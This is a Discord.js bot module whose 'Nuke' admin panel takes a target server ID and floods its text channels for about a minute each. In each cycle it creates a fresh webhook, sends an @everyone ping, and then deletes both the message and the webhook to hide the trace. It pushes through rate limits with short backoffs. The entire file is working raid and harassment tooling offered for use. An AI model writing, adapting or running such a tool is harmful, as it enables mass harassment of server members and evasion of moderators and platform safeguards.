const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, InteractionType } = require('discord.js');

module.exports = (client) => {
  const ADMIN_SERVER_ID  = '1455924604085473361';
  const ADMIN_CHANNEL_ID = '1455928469434138708';
  const PREFIX = '?';

  client.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    if (
      message.guild &&
      message.guild.id === ADMIN_SERVER_ID &&
      message.channel.id === ADMIN_CHANNEL_ID &&
      message.content.startsWith(PREFIX)
    ) {
      const args = message.content.slice(PREFIX.length).trim().split(/ +/);
      const command = args.shift().toLowerCase();

      if (command === 'command') {
        message.reply('Admin command triggered! Add your logic here.');
      } else if (command === 'adminpanel') {
        const embed = new EmbedBuilder()
          .setTitle('Admin Panel')
          .setDescription('Use the buttons below to perform admin tasks.')
          .setColor(0xFF4500);

        const button = new ButtonBuilder()
          .setCustomId('nukeButton')
          .setLabel('Nuke 🚀')
          .setStyle(ButtonStyle.Danger);

        const row = new ActionRowBuilder().addComponents(button);

        await message.channel.send({ embeds: [embed], components: [row] });
      } else if (command === 'nuke') {
        message.reply('Use the button in the admin panel instead.');
      } else {
        message.reply(`Unknown admin command: ${command}`);
      }
    }
  });

  client.on('interactionCreate', async (interaction) => {
    if (interaction.isButton() && interaction.customId === 'nukeButton') {
      const modal = new ModalBuilder()
        .setCustomId('nukeModal')
        .setTitle('Nuke Setup');

      const serverInput = new TextInputBuilder()
        .setCustomId('serverIdInput')
        .setLabel('Server ID')
        .setStyle(TextInputStyle.Short)
        .setRequired(true)
        .setPlaceholder('Enter Server ID');

      const channelInput = new TextInputBuilder()
        .setCustomId('channelIdInput')
        .setLabel('Channel ID (optional)')
        .setStyle(TextInputStyle.Short)
        .setRequired(false)
        .setPlaceholder('Leave empty to affect all channels');

      modal.addComponents(
        new ActionRowBuilder().addComponents(serverInput),
        new ActionRowBuilder().addComponents(channelInput)
      );

      await interaction.showModal(modal);
      return;
    }

    if (interaction.type !== InteractionType.ModalSubmit) return;
    if (interaction.customId !== 'nukeModal') return;

    await interaction.deferReply({ ephemeral: true });

    const serverId  = interaction.fields.getTextInputValue('serverIdInput').trim();
    const channelId = interaction.fields.getTextInputValue('channelIdInput').trim();

    try {
      const targetGuild = await client.guilds.fetch(serverId);
      if (!targetGuild) return await interaction.editReply('Server not found.');

      let targetChannels = [];

      if (channelId) {
        let targetChannel;
        try { targetChannel = await targetGuild.channels.fetch(channelId); } catch {}
        if (!targetChannel || !targetChannel.isTextBased()) {
          return await interaction.editReply('Invalid or non-text channel.');
        }
        targetChannels = [targetChannel];
      } else {
        targetChannels = targetGuild.channels.cache.filter(c =>
          c.isTextBased() &&
          c.permissionsFor(targetGuild.members.me)?.has(['SendMessages', 'ManageWebhooks'])
        );
        targetChannels = [...targetChannels.values()];
      }

      if (targetChannels.length === 0) {
        return await interaction.editReply('No channels with required permissions (SendMessages + ManageWebhooks).');
      }

      let totalSent = 0;
      const BURST_DURATION_MS = 60000; // ~1 minute burst per channel

      for (const channel of targetChannels) {
        const startTime = Date.now();
        let webhookCounter = 1;

        while (Date.now() - startTime < BURST_DURATION_MS) {
          try {
            // Unique webhook every cycle
            const webhookName = `Alert #${webhookCounter++}`;

            const webhook = await channel.createWebhook({
              name: webhookName,
              avatar: null, // Add random URL array here if you want varying avatars
              reason: 'Temp alert'
            });

            const sentMsg = await webhook.send({
              content: '@everyone',
              allowedMentions: { parse: ['everyone'] }
            });

            totalSent++;

            // Instant delete of the ping
            if (sentMsg?.id) {
              await sentMsg.delete().catch(() => {});
            }

            // Instant webhook cleanup
            await webhook.delete('Cleanup').catch(() => {});

            // No fixed delay → as fast as Discord permits

          } catch (err) {
            console.log(`[${channel.id}] Error: ${err.message || err} (code: ${err.code || 'unknown'})`);

            if (err.code === 429) {
              // Rate limit → short backoff then continue hammering
              await new Promise(r => setTimeout(r, 800)); // ~0.8s backoff
            } else if (err.code === 50027 || err.code === 10003 || err.code === 50035) {
              // Invalid webhook / channel issues → tiny pause
              await new Promise(r => setTimeout(r, 400));
            }
            // Keep going
          }
        }
      }

      await interaction.editReply(`Max-speed burst complete! Attempted **${totalSent}** @everyone pings via unique temp webhooks (with instant message + webhook delete). ~1 min per channel.`);
    } catch (error) {
      console.error('Nuke execution error:', error);
      await interaction.editReply('Error during command execution.');
    }
  });
};